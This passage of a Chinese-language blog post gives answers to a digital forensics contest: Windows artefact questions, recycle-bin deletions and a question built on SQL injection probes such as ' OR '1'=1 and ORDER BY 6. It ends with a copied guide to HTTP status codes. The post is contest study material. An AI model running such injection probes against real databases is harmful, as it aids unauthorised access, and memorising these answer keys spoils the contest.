srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a25"></p><p>系统信息中的时区信息</p><h5 id="34-单选题-该计算机的操作系统于何时安装以计算机系统时区回答-1分"><a class="markdownIt-Anchor" href="#34-单选题-该计算机的操作系统于何时安装以计算机系统时区回答-1分">#</a> 34. [单选题] 该计算机的操作系统于何时安装？(以计算机系统时区回答) (1 分)</h5><p>A. 2023-07-13 19:18:14<br>B. 2023-07-13 11:18:14<br>C. 2023-07-13 03:18:14<br>D. 2023-07-12 19:18:14</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca26.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca26.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a26"></p><h5 id="35-多选题-哪几个程序会于操作系统启动时自动执行1分"><a class="markdownIt-Anchor" href="#35-多选题-哪几个程序会于操作系统启动时自动执行1分">#</a> 35. [多选题] 哪 (几) 个程序会于操作系统启动时自动执行？(1 分)</h5><p>A. Avast</p><p>B. Steam</p><p>C. OneDrive</p><p>D. QQ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABC</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca27.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca27.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a27"></p><p>用户痕迹可以看到</p><h5 id="36-单选题-该计算机内安装了以下哪一个程序1分"><a class="markdownIt-Anchor" href="#36-单选题-该计算机内安装了以下哪一个程序1分">#</a> 36. [单选题] 该计算机内安装了以下哪一个程序？(1 分)</h5><p>A. QQ</p><p>B. WPS Office</p><p>C. Opera</p><p>D. Kaspersky</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca28.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca28.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a28"></p><p>安装软件中可以查看</p><h5 id="37-填空题-计算机内的onedrive程序版本是什么1分"><a class="markdownIt-Anchor" href="#37-填空题-计算机内的onedrive程序版本是什么1分">#</a> 37. [填空题] 计算机内的 OneDrive 程序版本是什么？(1 分）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">21.220.1024.0005</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca29.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca29.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a29"></p><p>安装软件找到 Microsoft OneDrive 即可查看版本号</p><h5 id="38-填空题-计算机有一个正在连接的网络接口该接口连接dhcp服务器的ip地址是多少提示-以-ipv4格式回答-1分"><a class="markdownIt-Anchor" href="#38-填空题-计算机有一个正在连接的网络接口该接口连接dhcp服务器的ip地址是多少提示-以-ipv4格式回答-1分">#</a> 38. [填空题] 计算机有一个正在连接的网络接口，该接口连接 DHCP 服务器的 IP 地址是多少？提示：以 IPV4 格式回答 (1 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.88.254</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca30.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca30.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a30"></p><p>系统痕迹系统信息中找到网络配置</p><h5 id="39-单选题-该计算机何时连接过一只u盘以计算机系统时区回答-1分"><a class="markdownIt-Anchor" href="#39-单选题-该计算机何时连接过一只u盘以计算机系统时区回答-1分">#</a> 39. [单选题] 该计算机何时连接过一只 U 盘？(以计算机系统时区回答) (1 分)</h5><p>A. 2023-07-13 11:48:26</p><p>B. 2023-07-13 03:48:29</p><p>C. 2023-07-12 19:48:29</p><p>D. 2023-07-13 11:48:29</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca31.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca31.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a31"></p><p>11:48:27-11:28:39 的区间内选</p><h5 id="40-多选题-elvis-chui-将哪几个文本文件放在回收站中3分"><a class="markdownIt-Anchor" href="#40-多选题-elvis-chui-将哪几个文本文件放在回收站中3分">#</a> 40. [多选题] Elvis Chui 将哪几个文本文件放在回收站中？(3 分)</h5><p>A. $+D10I76A74P.txt<br>B. Holiday schedule 2023-07-16.txt<br>C. Holiday schedule 2023-07-13.txt<br>D. Minute on 2023-07-01.txt<br>E. Minute on 2023-07-10.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BE</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca33.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca33.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a33"></p><p>仿起来看看</p><h5 id="41-单选题-elvis-chui在什么时间删除了第一个文本文件以计算机系统时区回答-3分"><a class="markdownIt-Anchor" href="#41-单选题-elvis-chui在什么时间删除了第一个文本文件以计算机系统时区回答-3分">#</a> 41. [单选题] Elvis Chui 在什么时间删除了第一个文本文件？(以计算机系统时区回答) (3 分)</h5><p>A. 2023-07-13 11:50:15<br>B. 2023-07-13 03:49:45<br>C. 2023-07-13 03:50:15<br>D. 2023-07-13 11:49:45</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca34.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca34.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a34"></p><p>回收站删除记录查看</p><h5 id="42-填空题-elvis-chui删除的第一个文本文件的文件名是什么提示-请用小写字母回答及需列明文件格式-如文件名字内有空格位置请用_标示-例如-go_to_schooldocx-2分"><a class="markdownIt-Anchor" href="#42-填空题-elvis-chui删除的第一个文本文件的文件名是什么提示-请用小写字母回答及需列明文件格式-如文件名字内有空格位置请用_标示-例如-go_to_schooldocx-2分">#</a> 42. [填空题] Elvis Chui 删除的第一个文本文件的文件名是什么？提示：请用小写字母回答及需列明文件格式。如文件名字内有空格位置，请用_标示。例如: go_to_school.docx (2 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">holiday_schedule_2023-07-16.txt</span><br></pre></td></tr></table></figure><p>同上</p><h5 id="43-单选题-elvis-chui删除的第一个文本文件在什么时间创建以计算机系统时区回答-2分"><a class="markdownIt-Anchor" href="#43-单选题-elvis-chui删除的第一个文本文件在什么时间创建以计算机系统时区回答-2分">#</a> 43. [单选题] Elvis Chui 删除的第一个文本文件在什么时间创建？(以计算机系统时区回答) (2 分)</h5><p>A. 2023-07-13_11:42:39<br>B. 2023-07-13_11:50:49<br>C. 2023-07-13_11:49:45<br>D. 2023-07-13_11:45:22</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca43.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca43.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a43"></p><h5 id="44填空题-elvis-chui计划于2023年7月15日20点5分有什么活动提示-答案请与文件内的文字与大细阶相同-1分"><a class="markdownIt-Anchor" href="#44填空题-elvis-chui计划于2023年7月15日20点5分有什么活动提示-答案请与文件内的文字与大细阶相同-1分">#</a> 44.[填空题] Elvis Chui 计划于 2023 年 7 月 15 日 20 点 5 分有什么活动？提示：答案请与文件内的文字与大细阶相同 (1 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Movie</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca44.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca44.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a44"></p><p>还原日程表</p><h5 id="45-填空题-该计算机执行steamexe总共多少次提示-请用阿拉伯数字作答-1分"><a class="markdownIt-Anchor" href="#45-填空题-该计算机执行steamexe总共多少次提示-请用阿拉伯数字作答-1分">#</a> 45. [填空题] 该计算机执行 STEAM.EXE 总共多少次？提示：请用阿拉伯数字作答 (1 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca45.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca45.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a45"></p><h5 id="46-单选题-一个名为account的数据库表拥有5个列以下哪一个指令会产生错误讯息-提示-1数据库是拥有正常默认的系统表格-2错误信息是关于超出上限的错误-1分"><a class="markdownIt-Anchor" href="#46-单选题-一个名为account的数据库表拥有5个列以下哪一个指令会产生错误讯息-提示-1数据库是拥有正常默认的系统表格-2错误信息是关于超出上限的错误-1分">#</a> 46. [单选题] 一个名为 “Account” 的数据库表拥有 5 个 &quot;列&quot;，以下哪一个指令会产生错误讯息？ (提示: 1. 数据库是拥有正常默认的系统表格 2. 错误信息是关于 &quot;超出上限&quot; 的错误) (1 分)</h5><p>A. SELECT * from Account WHERE name=‘Alex’ OR ‘1’=1<br>B. SELECT * FROM Account WHERE name=‘Bill’ UNION SELECT NULL, NULL, NULL, NULL<br>C. SELECT * from Account WHERE name=‘Candy’ ORDER BY 6<br>D. SELECT name FROM sys.tables</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure><p>sql 注入常识</p><h5 id="47-单选题-当客户端收到一个页面请求的http状态代码为304时以下哪种情况最有可能发生1分"><a class="markdownIt-Anchor" href="#47-单选题-当客户端收到一个页面请求的http状态代码为304时以下哪种情况最有可能发生1分">#</a> 47. [单选题] 当客户端收到一个页面请求的 HTTP 状态代码为 304 时，以下哪种情况最有可能发生？(1 分)</h5><p>A. 页面将显示错误</p><p>B. 页面将从浏览器缓存中加载</p><p>C. 浏览器将显示 “访问被拒绝”</p><p>D. 服务器将复位向客户端到另一个资源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><p>链接 [HTTP 状态码完整指南 - 阿里云开发者社区](<a href="https://developer.aliyun.com/article/1411397#:~:text=HTTP%E7%8A%B6%E6%80%81%E7%A0%81%EF%BC%88HTTP">https://developer.aliyun.com/article/1411397#:~:text=HTTP 状态码（HTTP</a> Status Code）是用以表示网页服务器超文本传输协议响应状态的 3 位数字代码。 它由 RFC 2616 规范定义的，并得到 RFC,2518、RFC 2817、RFC 2295、RFC 2774 与 RFC 4918 等规范扩展。)</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca46.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca46.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a46"></p><blockquote><h2 id="http-状态码列表"><a class="markdownIt-Anchor" href="#http-状态码列表">#</a> HTTP 状态码列表</h2><h3 id="1-1xx-informational"><a class="markdownIt-Anchor" href="#1-1xx-informational">#</a> 1. 1xx Informational</h3><p>1XX 的状态码是在 HTTP/1.1 中引入的，它们是信息性的状态码，是临时的，表示请求已被接受，需要继续处理。这些状态码并没有提供太多有用的信息，我们可能永远看不到 1XX 相关的状态码。</p><h4 id="1100-continue"><a class="markdownIt-Anchor" href="#1100-continue">#</a> （1）100 Continue</h4><p>服务器已收到浏览器的请求标头，并且现在已准备好发送请求正文。这使得请求过程更加高效，因为它可以防止浏览器发送正文请求，即使标头已被拒绝。</p><h4 id="2101-switching-protocols"><a class="markdownIt-Anchor" href="#2101-switching-protocols">#</a> （2）101 Switching Protocols</h4><p>服务器已经接受了客户端的请求，并将通过 <code>Upgrade</code>  消息头通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后，服务器将会切换到在 Upgrade 消息头中定义的协议。</p><h4 id="3102-processing"><a class="markdownIt-Anchor" href="#3102-processing">#</a> （3）102 Processing</h4><p>服务器已经收到并正在处理请求，目前还没有响应。这样可以防止客户端超时，并假设请求丢失。</p><h4 id="4103-early-hints"><a class="markdownIt-Anchor" href="#4103-early-hints">#</a> （4）103 Early hints</h4><p>在服务器响应的 HTTP 消息之前返回一些响应头。该状态码用于允许用户代理预加载资源，同时服务器准备响应。</p><h3 id="2-2xx-success"><a class="markdownIt-Anchor" href="#2-2xx-success">#</a> 2. 2xx Success</h3><p>2xx 状态码表示客户端的请求被成功接收、理解和接受。</p><h4 id="1200-ok"><a class="markdownIt-Anchor" href="#1200-ok">#</a> （1）200 OK</h4><p>表示客户端发来的请求被服务器端正常处理了。从 SEO 的角度来看，200 OK 状态码是功能页面的完美状态码，所有链接页面都在正常工作。200 表示搜索引擎爬虫可以成功爬取该页面并将其放入其搜索引擎中。</p><h4 id="2201-created"><a class="markdownIt-Anchor" href="#2201-created">#</a> （2）201 Created</h4><p>服务器完成了浏览器的请求，因此创建了一个或多个新资源。</p><h4 id="3202-accepted"><a class="markdownIt-Anchor" href="#3202-accepted">#</a> （3）202 Accepted</h4><p>服务器已接受浏览器的请求，但仍在处理中。该请求最终可能会也可能不会进行响应。</p><h4 id="4203-non-authoritative-information"><a class="markdownIt-Anchor" href="#4203-non-authoritative-information">#</a> （4）203 Non-authoritative Information</h4><p>使用代理时可能会出现此状态代码。这意味着代理服务器从源服务器收到了 200 状态代码，但在将响应传递给浏览器之前已对其进行了修改。</p><h4 id="5204-no-content"><a class="markdownIt-Anchor" href="#5204-no-content">#</a> （5）204 No Content</h4><p>该状态码表示客户端发送的请求已经在服务器端正常处理了，但是没有返回的内容，响应报文中不包含实体的主体部分。一般在只需要从客户端往服务器端发送信息，而服务器端不需要往客户端发送内容时使用。</p><h4 id="6205-reset-content"><a class="markdownIt-Anchor" href="#6205-reset-content">#</a> （6）205 Reset Content</h4><p>服务器端成功处理了请求，且没有返回任何内容。但是与 204 响应不同，返回此状态码的响应要求请求者重置文档视图。该响应主要是被用于接受用户输入后，立即重置表单，以便用户能够轻松地开始另一次输入。</p><h4 id="7206-partial-content"><a class="markdownIt-Anchor" href="#7206-partial-content">#</a> （7）206 Partial Content</h4><p>该状态码表示客户端进行了范围请求，而服务器端执行了这部分的 GET 请求。响应报文中包含由  <code>Content-Range</code>  指定范围的实体内容。</p><h4 id="8226-im-used"><a class="markdownIt-Anchor" href="#8226-im-used">#</a> （8）226 IM Used</h4><p>服务器已成功处理浏览器的 GET 方法，以检索已缓存资源的更新版本。通常，当请求的资源有一个或多个轻微修改时返回响应。</p><h3 id="3-3xx-redirection"><a class="markdownIt-Anchor" href="#3-3xx-redirection">#</a> 3. 3xx Redirection</h3><p>3XX 响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。</p><h4 id="1300-multiple-choices"><a class="markdownIt-Anchor" href="#1300-multiple-choices">#</a> （1）300 Multiple Choices</h4><p>有时，服务器可能会响应多种可能的资源来满足浏览器的请求。300 状态码意味着浏览器现在需要在它们之间进行选择。当有多个可用的文件类型扩展名时，可能会发生这种情况。</p><h4 id="2301-moved-permanently"><a class="markdownIt-Anchor" href="#2301-moved-permanently">#</a> （2）301 Moved Permanently</h4><p>** 永久重定向。** 已为目标资源分配了一个新的永久 URI。新的 URI 会在 HTTP 响应头中的 Location 首部字段指定。若用户已经把原来的 URI 保存为书签，此时会按照 Location 中新的 URI 重新保存该书签。同时，搜索引擎在抓取新内容的同时也将旧的网址替换为重定向之后的网址。</p><h4 id="3302-found"><a class="markdownIt-Anchor" href="#3302-found">#</a> （3）302 Found</h4><p>** 临时重定向。** 请求的资源被分配到了新的 URI，希望用户（本次）能使用新的 URI 访问资源。和 301 Moved Permanently 状态码相似，但是 302 代表的资源不是被永久重定向，只是临时性质的。也就是说已移动的资源对应的 URI 将来还有可能发生改变。</p><p>若用户把 URI 保存成书签，但不会像 301 状态码出现时那样去更新书签，而是仍旧保留返回 302 状态码的页面对应的 URI。同时，搜索引擎会抓取新的内容而保留旧的网址。因为服务器返回 302 代码，搜索引擎认为新的网址只是暂时的。</p><p><strong>使用场景：</strong></p><ul><li>未登陆的用户访问用户中心重定向到登录页面。</li><li>访问 404 页面重新定向到首页。</li></ul><h4 id="4303-see-other"><a class="markdownIt-Anchor" href="#4303-see-other">#</a> （4）303 See Other</h4><p>由于请求对应的资源存在着另一个 URI，应使用 GET 方法定向获取请求的资源。</p><p>303 状态码和 302 Found 状态码有着相似的功能，但是 303 状态码明确表示客户端应当采用 GET 方法获取资源。303 状态码通常作为 PUT 或 POST 操作的返回结果，它表示重定向链接指向的不是新上传的资源，而是另外一个页面，比如消息确认页面或上传进度页面。而请求重定向页面的方法要总是使用 GET。</p><p>注意：</p><blockquote><ul><li>当 301、302、303 响应状态码返回时，几乎所有的浏览器都会把 POST 改成 GET，并删除请求报文内的主体，之后请求会再次自动发送。</li><li>301、302 标准是禁止将 POST 方法变成 GET 方法的，但实际大家都会这么做。</li></ul></blockquote><h4 id="5304-not-modified"><a class="markdownIt-Anchor" href="#5304-not-modified">#</a> （5）304 Not Modified</h4><p>浏览器缓存相关。该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况。304 状态码返回时，不包含任何响应的主体部分。304 虽然被划分在 3XX 类别中，但是和重定向没有关系。</p><p>带条件的请求（Http 条件请求）：使用 Get 方法 请求，请求报文中包含（ <code>if-match</code> 、 <code>if-none-match</code> 、 <code>if-modified-since</code> 、 <code>if-unmodified-since</code> 、 <code>if-range</code> ）中任意首部。</p><p>状态码 304 并不是一种错误，而是告诉客户端有缓存，直接使用缓存中的数据。返回页面的只有头部信息，是没有内容部分的，这样在一定程度上提高了网页的性能。</p><h4 id="6305-use-proxy"><a class="markdownIt-Anchor" href="#6305-use-proxy">#</a> （6）305 Use Proxy</h4><p>服务器需要代理才能返回请求的资源。此响应代码当前未使用，因为当前大多数浏览器由于安全问题不支持它。</p><h4 id="7307-temporary-redirect"><a class="markdownIt-Anchor" href="#7307-temporary-redirect">#</a> （7）307 Temporary Redirect</h4><p><strong>临时重定向</strong>。该状态码与 302 Found 有着相同含义，尽管 302 标准禁止 POST 变成 GET，但是实际使用时还是用了。307 会遵守浏览器标准，<strong>不会从 POST 变成 GET</strong>。但是对于处理请求的行为时，不同浏览器还是会出现不同的情况。规范要求浏览器继续向 Location 的地址 POST 内容。规范要求浏览器继续向 Location 的地址 POST 内容。</p><h4 id="8308-permanent-redirect"><a class="markdownIt-Anchor" href="#8308-permanent-redirect">#</a> （8）308 Permanent Redirect</h4><p>永久重定向，当前及未来的请求重定向到了新的 URL。</p><h3 id="4-4xx-client-errors"><a class="markdownIt-Anchor" href="#4-4xx-client-errors">#</a> 4. 4xx Client errors</h3><h4 id="1400-bad-request"><a class="markdownIt-Anchor" href="#1400-bad-request">#</a> （1）400 Bad Request</h4><p>请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次发送请求。</p><h4 id="2401-unauthorized"><a class="markdownIt-Anchor" href="#2401-unauthorized">#</a> （2）401 Unauthorized</h4><p>发送的请求需要有通过 HTTP 认证 (BASIC 认证、DIGEST 认证) 的认证信息。若之前已进行过一次请求，则表示用户认证失败。返回含有 401 的响应必须包含一个适用于被请求资源的 WWW-Authenticate 首部用以质询 (challenge) 用户信息。当浏览器初次接收到 401 响应，会弹出认证用的对话窗口。</p><h4 id="3402-payment-required"><a class="markdownIt-Anchor" href="#3402-payment-required">#</a> （3）402 Payment Required</h4><p>为数字支付系统保留的。不过，它并没有被广泛使用。</p><h4 id="4403-forbidden"><a class="markdownIt-Anchor" href="#4403-forbidden">#</a> （4）403 Forbidden</h4><p>客户端请求已被拒绝，因为客户端无权访问内容。与 401 不同，服务器知道客户端的身份，但由于他们无权查看内容，因此服务器拒绝提供正确的响应。</p><h4 id="5404-not-found"><a class="markdownIt-Anchor" href="#5404-not-found">#</a> （5）404 Not Found</h4><p>服务器上无法找到请求的资源，但将来可能可用。除此之外，也可以在服务器端拒绝请求且不想说明理由时使用。</p><h4 id="6405-method-not-allowed"><a class="markdownIt-Anchor" href="#6405-method-not-allowed">#</a> （6）405 Method Not Allowed</h4><p>服务器识别到浏览器使用的 HTTP 请求方法，但需要使用不同的方法才能提供所需的资源。服务器应该总是允许客户端使用 GET 和 HEAD 方法进行访问。</p><p>客户端可以通过 OPTIONS 方法（预检）来查看服务器允许的访问方法，如下</p><p>javascript</p><p>复制代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE</span><br></pre></td></tr></table></figure><h4 id="7406-not-acceptable"><a class="markdownIt-Anchor" href="#7406-not-acceptable">#</a> （7）406 Not Acceptable</h4><p>服务器通知客户端没有资源符合浏览器请求的标准。</p><h4 id="8407-proxy-authentication-required"><a class="markdownIt-Anchor" href="#8407-proxy-authentication-required">#</a> （8）407 Proxy Authentication Required</h4><p>客户端必须首先通过代理进行身份验证。</p><h4 id="9408-request-timeout"><a class="markdownIt-Anchor" href="#9408-request-timeout">#</a> （9）408 Request Timeout</h4><p>当服务器在等待来自浏览器的完整请求时超时时会生成此状态码。换句话说，服务器没有收到浏览器发送的完整请求。一种可能的原因就是网络拥塞导致浏览器和服务器之间的数据包丢失。</p><h4 id="10409-conflict"><a class="markdownIt-Anchor" href="#10409-conflict">#</a> （10）409 Conflict</h4><p>服务器无法处理浏览器的请求，因为与相关资源存在冲突。这有时是由于多个同时编辑而发生的。</p><h4 id="11410-gone"><a class="markdownIt-Anchor" href="#11410-gone">#</a> （11）410 Gone</h4><p>请求的资源将来将不再可用。</p><h4 id="12411-length-required"><a class="markdownIt-Anchor" href="#12411-length-required">#</a> （12）411 Length Required</h4><p>请求的资源需要客户端指定一定的长度，通过 Content-Length 来定义。</p><h4 id="13412-precondition-failed"><a class="markdownIt-Anchor" href="#13412-precondition-failed">#</a> （13）412 Precondition Failed</h4><p>服务器不满足请求头字段中指示的一个或多个先决条件。</p><h4 id="14413-payload-too-large"><a class="markdownIt-Anchor" href="#14413-payload-too-large">#</a> （14）413 Payload Too Large</h4><p>服务器拒绝处理请求，因为请求的负载大于服务器能够或愿意处理的。虽然服务器可能会关闭连接以阻止客户端继续请求，但它应该生成一个 Retry-After 头字段以及客户端可以在多长时间后重试。</p><h4 id="15414-request-uri-too-long"><a class="markdownIt-Anchor" href="#15414-request-uri-too-long">#</a> （15）414 Request-URI Too Long</h4><p>浏览器发出的请求无法被服务器处理，因为客户端将太多数据编码为查询字符串，然后作为 GET 方法发送。</p><h4 id="16415-unsupported-media-type"><a class="markdownIt-Anchor" href="#16415-unsupported-media-type">#</a> （16）415 Unsupported Media Type</h4><p>请求已被服务器拒绝，因为它不支持请求数据的媒体格式。</p><h4 id="17416-requested-range-not-satisfiable"><a class="markdownIt-Anchor" href="#17416-requested-range-not-satisfiable">#</a> （17）416 Requested Range Not Satisfiable</h4><p>请求的 Range 头中指定的范围无法满足。原因可能是给定范围超出了目标 URI 数据的大小。</p><h4 id="18417-expectation-failed"><a class="markdownIt-Anchor" href="#18417-expectation-failed">#</a> （18）417 Expectation Failed</h4><p>服务器无法满足请求的请求头的 Expect 字段中指定的要求。</p><h4 id="19421-misdirected-request"><a class="markdownIt-Anchor" href="#19421-misdirected-request">#</a> （19）421 Misdirected Request</h4><p>浏览器的请求已被重定向到其他服务器，该服务器无法产生响应。</p><h4 id="20422-unprocessable-entity"><a class="markdownIt-Anchor" href="#20422-unprocessable-entity">#</a> （20）422 Unprocessable Entity</h4><p>浏览器发出的请求中存在语义错误，服务器无法处理。</p><h4 id="21423-locked"><a class="markdownIt-Anchor" href="#21423-locked">#</a> （21）423 Locked</h4><p>对所需资源的访问被拒绝，因为它已被锁定。</p><h4 id="22424-failed-dependency"><a class="markdownIt-Anchor" href="#22424-failed-dependency">#</a> （22）424 Failed Dependency</h4><p>浏览器发出的请求失败，因为它依赖于另一个请求，而该请求失败了。</p><h4 id="23426-upgrade-required"><a class="markdownIt-Anchor" href="#23426-upgrade-required">#</a> （23）426 Upgrade Required</h4><p>当服务器拒绝使用当前协议执行给定的请求时，它可能愿意在客户端升级到不同的协议后这来执行请求。</p><h4 id="24428-precondition-required"><a class="markdownIt-Anchor" href="#24428-precondition-required">#</a> （24）428 Precondition Required</h4><p>服务器要求在处理请求之前指定条件。</p><h4 id="25429-too-many-requests"><a class="markdownIt-Anchor" href="#25429-too-many-requests">#</a> （25）429 Too Many Requests</h4><p>用户在给定的时间内发送了太多请求（速率限制）时，这是由服务器生成的。这有时可能是由于机器人或脚本试图访问站点而造成的。</p><h4 id="26431-request-header-fields-too-large"><a class="markdownIt-Anchor" href="#26431-request-header-fields-too-large">#</a> （26）431 Request Header Fields Too Large</h4><p>服务器无法处理请求，因为标头字段太大。这可能是单个标头字段或所有标头字段存在问题。</p><h4 id="27451-unavailable-for-legal-reasons"><a class="markdownIt-Anchor" href="#27451-unavailable-for-legal-reasons">#</a> （27）451 Unavailable For Legal Reasons</h4><p>服务器的运营商收到了禁止访问请求的资源的要求。</p><h4 id="28499-client-closed-request"><a class="markdownIt-Anchor" href="#28499-client-closed-request">#</a> （28）499 Client closed request</h4><p>当 nginx 正在处理请求时，客户端关闭了连接，nginx 就会返回此状态码。</p><h3 id="5-5xx-server-error"><a class="markdownIt-Anchor" href="#5-5xx-server-error">#</a> 5. 5xx Server Error</h3><p>5XX 的响应结果表明服务器本身发生错误。</p><h4 id="1500-internal-server-error"><a class="markdownIt-Anchor" href="#1500-internal-server-error">#</a> （1）500 Internal Server Error</h4><p>服务器端在执行请求时发生了错误。也有可能是应用存在 bug 或某些临时的故障。</p><h4 id="2501-not-implemented"><a class="markdownIt-Anchor" href="#2501-not-implemented">#</a> （2）501 Not Implemented</h4><p>请求无法处理，因为服务器不支持。</p><h4 id="3502-bad-gateway"><a class="markdownIt-Anchor" href="#3502-bad-gateway">#</a> （3）502 Bad 